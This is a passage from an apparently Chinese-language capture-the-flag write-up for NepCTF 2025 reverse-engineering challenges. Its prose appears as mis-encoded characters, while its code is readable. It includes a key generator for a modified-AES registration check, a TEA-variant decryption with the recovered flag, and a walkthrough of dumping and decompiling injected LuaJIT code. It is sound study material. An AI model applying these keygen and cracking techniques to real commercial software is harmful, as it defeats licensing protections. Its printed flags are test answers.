å¯†ç»“æœèƒ½å¯¹ä¸Šï¼Œè¯´æ˜å°±åªæœ‰MixColumnsä¸€å¤„è¿›è¡Œäº†é­”æ”¹ï¼Œè¿™æ ·å°±å¯ä»¥å†™æ³¨å†Œæœºäº†ã€‚</p><p>æ³¨å†Œæœºä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AES.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetPassword</span><span class="params">(std::string UserName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> hLibCrypto = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;libcrypto_.dll&quot;</span>);</span><br><span class="line">    DWORD* (*MD5_)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>, <span class="type">uint8_t</span>*, <span class="type">int</span>) = (DWORD * (*)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>, <span class="type">uint8_t</span>*, <span class="type">int</span>))(<span class="built_in">GetProcAddress</span>(hLibCrypto, <span class="string">&quot;sign&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MD5_</span>(UserName.<span class="built_in">c_str</span>(), UserName.<span class="built_in">length</span>(), Key, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Cipher[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> Str1 = UserName + <span class="string">&quot;Showmaker11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MD5_</span>(Str<span class="number">1.</span><span class="built_in">c_str</span>(), Str<span class="number">1.l</span>ength(), Cipher, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Password_bytes[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// invMixColumns å¼‚æˆ– 0x55</span></span><br><span class="line">    <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, Cipher, Password_bytes, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    std::string Password;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> Buffer[<span class="number">10</span>]&#123;&#125;;</span><br><span class="line">        <span class="built_in">sprintf_s</span>(Buffer, <span class="string">&quot;%02x&quot;</span>,Password_bytes[i]);</span><br><span class="line">        Password += Buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">GetPassword</span>(<span class="string">&quot;inkey&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4ac06ab6f14dfc1bbfa65d00c9cd012b</span></span><br></pre></td></tr></table></figure><p>æœ€åå°†ç½‘é¡µä¸Šçš„åç§°éƒ½å­˜åˆ°æœ¬åœ°æ–‡ä»¶ï¼Œä¿®æ”¹æ³¨å†Œæœºä»£ç ï¼Œä¸€é”®è·å–Passwordï¼Œç„¶åæ‰‹åŠ¨å¡«å†™åˆ°ç½‘é¡µæäº¤å³å¯å¾—åˆ°Flagã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-16.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-17.png" alt="alt text"></p><h2 id="QRS"><a href="#QRS" class="headerlink" title="QRS"></a>QRS</h2><p>è¿è¡Œï¼Œå‘ç°å¯åŠ¨äº†ä¸€ä¸ªæœåŠ¡ï¼Œç½‘é¡µæ‰“å¼€æç¤ºè¿™ä¸ªï¼Œåº”è¯¥æ˜¯ç”¨inputå‚æ•°æäº¤Flagè¿›è¡ŒCheckã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-18.png" alt="alt text"></p><p>IDAå­—ç¬¦ä¸²æœç´¢missing fieldï¼ŒæŸ¥çœ‹äº¤å‰è°ƒç”¨æ‰¾åˆ°è°ƒç”¨æ–¹å‡½æ•°ï¼Œæ–­ç‚¹åœ¨è¿”å›å¤„ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-19.png" alt="alt text"></p><p>è°ƒè¯•è¿è¡Œç¨‹åºï¼Œç½‘é¡µæ‰“å¼€è§¦å‘æ–­ç‚¹ï¼Œå¾€ä¸Šèµ°ä¸¤å±‚ï¼Œèµ°åˆ°å¦‚ä¸‹å‡½æ•°ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-20.png" alt="alt text"></p><p>åœ¨è¯¥å‡½æ•°ä¸‹é¢ä¼šçœ‹åˆ°è¿™è¾¹æœ‰ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå¦‚æœç½‘é¡µè®¿é—®å¸¦inputå‚æ•°ä¼ å…¥æ–‡æœ¬ï¼Œmark2å‡½æ•°å°±ä¼šä¼ å…¥inputçš„æ˜æ–‡ï¼Œä»¥åŠè·å–çš„ä¸€ä¸²keyã€‚</p><p>åŠ å¯†å®Œï¼Œä¸‹é¢ä¹Ÿä»xmmè·å–æ•°æ®ï¼Œè¿›è¡Œcmpæ¯”å¯¹ï¼Œé‚£ä¹ˆä¸‹é¢çš„é‚£ä¸¤ä¸²xmmæ•°æ®å°±åº”è¯¥æ˜¯å¯†æ–‡ï¼Œmark2æ˜¯åŠ å¯†å‡½æ•°ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-22.png" alt="alt text"></p><p>mark2æ ¸å¿ƒåŠ å¯†ä»£ç å¦‚ä¸‹ï¼Œæ˜¯ä¸€ä¸ªé­”æ”¹çš„TeaåŠ å¯†ï¼Œè€ŒDeltaä½¿ç”¨GetTickCountï¼Œåº”è¯¥æ˜¯æœªçŸ¥çš„ï¼Œä½†æ˜¯å®é™…è°ƒè¯•å‘ç°ä¸ç®¡ä»€ä¹ˆæ—¶å€™è¿™è¾¹è·å–åˆ°çš„TickCountéƒ½æ˜¯å›ºå®šçš„ï¼Œå€¼ä¸ºï¼š0x68547369ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-23.png" alt="alt text"></p><p>æå–å¯†æ–‡å’Œå¯†é’¥ï¼Œç¼–å†™è§£å¯†å³å¯å¾—åˆ°Flagã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec</span><span class="params">(DWORD &amp;v24, DWORD &amp;v25, DWORD Tick)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x01234567</span>, <span class="number">0x89ABCDEF</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span>&#125;;</span><br><span class="line">    DWORD TickCount = Tick;</span><br><span class="line">    <span class="type">int</span> v26 = <span class="number">48</span>;</span><br><span class="line">    DWORD v28 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v28 = TickCount * <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v28 -= TickCount;</span><br><span class="line">        v25 -= (v24 + ((<span class="number">16</span> * v24) ^ (v24 &gt;&gt; <span class="number">5</span>))) ^ (v28 + TickCount + key[(((v28 + TickCount) &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xC</span>) / <span class="number">4</span>]);</span><br><span class="line">        v24 -= (v25 + ((<span class="number">16</span> * v25) ^ (v25 &gt;&gt; <span class="number">5</span>))) ^ (key[v28 &amp; <span class="number">3</span>] + v28);</span><br><span class="line">        --v26;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v26);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x083EA621</span>, <span class="number">0xC745973C</span>, <span class="number">0xE3B77AE8</span>, <span class="number">0xCDEE8146</span>, <span class="number">0x7DC86B96</span>, <span class="number">0x6B8C9D3B</span>, <span class="number">0x79B14342</span>, <span class="number">0x2ECF0F0D</span>&#125;;</span><br><span class="line"></span><br><span class="line">    DWORD v1&#123;&#125;, v2&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt; <span class="number">4</span>; s++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = enc[s * <span class="number">2</span>], v2 = enc[s * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">Dec</span>(v1, v2, <span class="number">0x68547369</span>);</span><br><span class="line">        enc[s * <span class="number">2</span>] = v1;</span><br><span class="line">        enc[s * <span class="number">2</span> + <span class="number">1</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NepCTF&#123;%.32s&#125;\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NepCTF&#123;a4747f82be106d3f8c4d747c744d7ee5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="SpeedMino-Warlock"><a href="#SpeedMino-Warlock" class="headerlink" title="SpeedMino-Warlock"></a>SpeedMino-Warlock</h2><p>main.luaé‡Œé¢è§£å¯†å‡ºæ¥æ˜¯fake flagã€‚</p><p>IDAåŠ è½½version.dllï¼Œå‘ç°å­—ç¬¦ä¸²å­˜åœ¨lovely-injectorï¼Œé‚£ä¹ˆè¿™ä¸ªversion.dllå°±æ˜¯lovely-injectoré¡¹ç›®çš„ï¼Œç”¨äºåŠ«æŒæ³¨å…¥ä¿®æ”¹luaä»£ç ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-24.png" alt="alt text"></p><p>ç”±äºè¯¥lovely-injectoræºç è¢«å‡ºé¢˜äººä¿®æ”¹è¿‡ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºä»»ä½•æ–‡ä»¶æˆ–logåˆ°æœ¬åœ°ï¼Œåªèƒ½é€šè¿‡å…¶ä»–æ–¹æ³•å¾—åˆ°å³å°†è¢«æ³¨å…¥çš„luaä»£ç ï¼Œä¸‹é¢æä¾›ä¸¤ç§æ–¹æ³•ã€‚</p><h3 id="æ³•ä¸€ï¼šCEç›´æ¥æœç´¢"><a href="#æ³•ä¸€ï¼šCEç›´æ¥æœç´¢" class="headerlink" title="æ³•ä¸€ï¼šCEç›´æ¥æœç´¢"></a>æ³•ä¸€ï¼šCEç›´æ¥æœç´¢</h3><p>åŸç¨‹åºmain.luaè¿™éƒ¨åˆ†ä»£ç æ˜¯è·å–å‰ªè´´æ¿å†…å®¹ï¼Œç„¶åè¿›è¡ŒcalcDataåŠ å¯†ä¸ä¸‹é¢çš„å‡flagå¯†æ–‡æ¯”å¯¹ï¼Œå°è¯•åœ¨CEæœç´¢result_tableï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„è°ƒç”¨ä»£ç ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-25.png" alt="alt text"></p><p>å¯ä»¥æœåˆ°ä¸¤å¤„ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-26.png" alt="alt text"></p><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­ä¸€ä¸ªæ˜¯åœ¨ä¸€ä¸ªæ²¡è§è¿‡çš„luaä»£ç é‡Œé¢è°ƒç”¨çš„ï¼Œè¿™è¾¹ä»NEUROï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢é‚£äº›å­—èŠ‚åŠ è½½äº†ä¸€ä¸ªluajitå‡½æ•°ï¼Œä¼ å…¥result_tableè¿›è¡Œäº†Checkï¼Œç„¶åè¾“å‡ºâ€PERFECT!â€ï¼Œé‚£ä¹ˆä¸Šé¢è¿™ä¸ªluajitå‡½æ•°å°±æ˜¯çœŸå®çš„Checkå‡½æ•°ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-27.png" alt="alt text"></p><h3 id="æ³•äºŒï¼šå¯ç”¨dump-allå‚æ•°"><a href="#æ³•äºŒï¼šå¯ç”¨dump-allå‚æ•°" class="headerlink" title="æ³•äºŒï¼šå¯ç”¨dump_allå‚æ•°"></a>æ³•äºŒï¼šå¯ç”¨dump_allå‚æ•°</h3><p>æŸ¥é˜…lovely-injectoré¡¹ç›®æºç ï¼Œå‘ç°initè¿™è¾¹æœ‰ä¸ªdump_allå‚æ•°ï¼Œç”¨äºdumpå³å°†è¦è¢«æ³¨å…¥çš„ä»£ç ï¼Œ</p><p><img src="/2025/07/28/NepCTF2025/image-32.png" alt="alt text"></p><p>åœ¨version.dllçš„dllmainå‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¿™è¾¹æœ‰åˆ¤æ–­æ˜¯å¦æœ‰â€â€“dump-allâ€å‚æ•°ï¼Œæ¥å¯ç”¨dump_allåŠŸèƒ½ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-28.png" alt="alt text"></p><p>æ–­ç‚¹ç»™dump_all_boolèµ‹å€¼0çš„åœ°æ–¹ï¼Œæ­¥è¿‡æ‰§è¡Œä¸€æ­¥ï¼Œå°†rsiæ”¹æˆ1ï¼Œç„¶åè¿è¡Œï¼Œå°±ä¼šå¼¹å‡ºdumpå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯luajitä»£ç ã€‚</p><p><img src="/2025/07/28/NepCTF2025/image-31.png" alt="alt text"></p><p><img src="/2025/07/28/NepCTF2025/image-30.png" alt="alt text"></p><h3 id="luajitåˆ†æ"><a href="#luajitåˆ†æ" class="headerlink" title="luajitåˆ†æ"></a>luajitåˆ†æ</h3><p>å°†ä¸Šé¢çš„å¾—åˆ°çš„luajitå­—èŠ‚è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä½¿ç”¨<a href="https://github.com/weaweawe01/luajit_decompile%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8Cluajit%E5%8F%8D%E7%BC%96%E8%AF%91%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8Blua%E4%BB%A3%E7%A0%81%E3%80%82">https://github.com/weaweawe01/luajit_decompileé¡¹ç›®è¿›è¡Œluajitåç¼–è¯‘ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹luaä»£ç ã€‚</a></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">slot1 = <span class="function"><span class="keyword">function</span><span class="params">(slot0, slot1)</span></span></span><br><span class="line">        slot2 = <span class="number">0</span> + slot0 * <span class="number">384</span> + slot1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">                slot3 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">                        <span class="keyword">if</span> slot2 &lt; slot3 * slot3 <span class="keyword">and</span> (slot2 - <span class="number">1</span>) % <span class="number">5</span> ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                                <span class="keyword">return</span> slot2</span><br><span class="line">                        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> slot2 % slot3 == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                        slot3 = slot3 + <span class="number">1</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                slot2 = slot2 + <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">383</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">slot2 = &#123;</span><br><span class="line">        <span class="number">36506</span>,</span><br><span class="line">        <span class="number">88774</span>,</span><br><span class="line">        <span class="number">438822</span>,</span><br><span class="line">        <span class="number">666001</span>,</span><br><span class="line">        <span class="number">109051</span>,</span><br><span class="line">        <span class="number">2124674</span>,</span><br><span class="line">        <span class="number">2767204</span>,</span><br><span class="line">        <span class="number">2610244</span>,</span><br><span class="line">        <span class="number">3272321</span>,</span><br><span class="line">        <span class="number">8662979</span>,</span><br><span class="line">        <span class="number">5131975</span>,</span><br><span class="line">        <span class="number">1034228</span>,</span><br><span class="line">        <span class="number">6712315</span>,</span><br><span class="line">        <span class="number">12760199</span>,</span><br><span class="line">        <span class="number">20058866</span>,</span><br><span class="line">        <span class="number">6854477</span>,</span><br><span class="line">        <span class="number">6126314</span>,</span><br><span class="line">        <span class="number">3871829</span>,</span><br><span class="line">        <span class="number">13815442</span>,</span><br><span class="line">        <span class="number">15034520</span>,</span><br><span class="line">        <span class="number">38884726</span>,</span><br><span class="line">        <span class="number">10742135</span>,</span><br><span class="line">        <span class="number">26199509</span>,</span><br><span class="line">        <span class="number">45230422</span>,</span><br><span class="line">        <span class="number">46725610</span>,</span><br><span class="line">        <span class="number">7627278</span>,</span><br><span class="line">        <span class="number">21052590</span>,</span><br><span class="line">        <span class="number">68432885</span>,</span><br><span class="line">        <span class="number">48719842</span>,</span><br><span class="line">        <span class="number">94974872</span>,</span><br><span class="line">        <span class="number">55215219</span>,</span><br><span class="line">        <span class="number">113201828</span>,</span><br><span class="line">        <span class="number">86070272</span>,</span><br><span class="line">        <span class="number">153897959</span>,</span><br><span class="line">        <span class="number">136736481</span>,</span><br><span class="line">        <span class="number">88243015</span>,</span><br><span class="line">        <span class="number">108020790</span>,</span><br><span class="line">        <span class="number">71691707</span>,</span><br><span class="line">        <span class="number">157143593</span>,</span><br><span class="line">        <span class="number">22399026</span>,</span><br><span class="line">        <span class="number">41588356</span>,</span><br><span class="line">        <span class="number">220309217</span>,</span><br><span class="line">        <span class="number">86844145</span>,</span><br><span class="line">        <span class="number">129645965</span>,</span><br><span class="line">        <span class="number">240111657</span>,</span><br><span class="line">        <span class="number">257783827</span>,</span><br><span class="line">        <span class="number">92900284</span>,</span><br><span class="line">        <span class="number">52969902</span>,</span><br><span class="line">        <span class="number">27539801</span>,</span><br><span class="line">        <span class="number">275411785</span>,</span><br><span class="line">        <span class="number">364406385</span>,</span><br><span class="line">        <span class="number">253200306</span>,</span><br><span class="line">        <span class="number">389008554</span>,</span><br><span class="line">        <span class="number">359199685</span>,</span><br><span class="line">        <span class="number">337450915</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="function"><span class="keyword">function</span> <span class="params">(slot0)</span></span></span><br><span class="line">        slot1 = <span class="number">1</span></span><br><span class="line">        slot2 = &#123;</span><br><span class="line">                <span class="number">359</span>,</span><br><span class="line">                <span class="number">383</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> #uv0 ~= #slot0 <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> slot6 = <span class="number">1</span>, #slot0 <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">64</span> + slot0[slot6])^<span class="number">5</span> % (slot2[slot6] * slot2[slot6 + <span class="number">1</span>]) ~= uv0[slot6] <span class="keyword">then</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">                slot2[slot6 + <span class="number">2</span>] = uv1(slot6, slot0[slot6])</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span>)(slot0)</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¯¹åº”ç¼–å†™è§£å¯†å³å¯ï¼Œç„¶åè¿˜éœ€è¦å†è§£å¯†ä¸€å±‚CalcDataåŠ å¯†ã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">Enc = [</span><br><span class="line">    <span class="number">36506</span>, <span class="number">88774</span>, <span class="number">438822</span>, <span class="number">666001</span>, <span class="number">109051</span>, <span class="number">2124674</span>, <span class="number">2767204</span>, <span class="number">2610244</span>,</span><br><span class="line">    <span class="number">3272321</span>, <span class="number">8662979</span>, <span class="number">5131975</span>, <span class="number">1034228</span>, <span class="number">6712315</span>, <span class="number">12760199</span>, <span class="number">20058866</span>,</span><br><span class="line">    <span class="number">6854477</span>, <span class="number">6126314</span>, <span class="number">3871829</span>, <span class="number">13815442</span>, <span class="number">15034520</span>, <span class="number">38884726</span>, <span class="number">10742135</span>,</span><br><span class="line">    <span class="number">26199509</span>, <span class="number">45230422</span>, <span class="number">46725610</span>, <span class="number">7627278</span>, <span class="number">21052590</span>, <span class="number">68432885</span>, <span class="number">48719842</span>,</span><br><span class="line">    <span class="number">94974872</span>, <span class="number">55215219</span>, <span class="number">113201828</span>, <span class="number">86070272</span>, <span class="number">153897959</span>, <span class="number">136736481</span>,</span><br><span class="line">    <span class="number">88243015</span>, <span class="number">108020790</span>, <span class="number">71691707</span>, <span class="number">157143593</span>, <span class="number">22399026</span>, <span class="number">41588356</span>,</span><br><span class="line">    <span class="number">220309217</span>, <span class="number">86844145</span>, <span class="number">129645965</span>, <span class="number">240111657</span>, <span class="number">257783827</span>, <span class="number">92900284</span>,</span><br><span class="line">    <span class="number">52969902</span>, <span class="number">27539801</span>, <span class="number">275411785</span>, <span class="number">364406385</span>, <span class="number">253200306</span>, <span class="number">389008554</span>,</span><br><span class="line">    <span class="number">359199685</span>, <span class="number">337450915</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 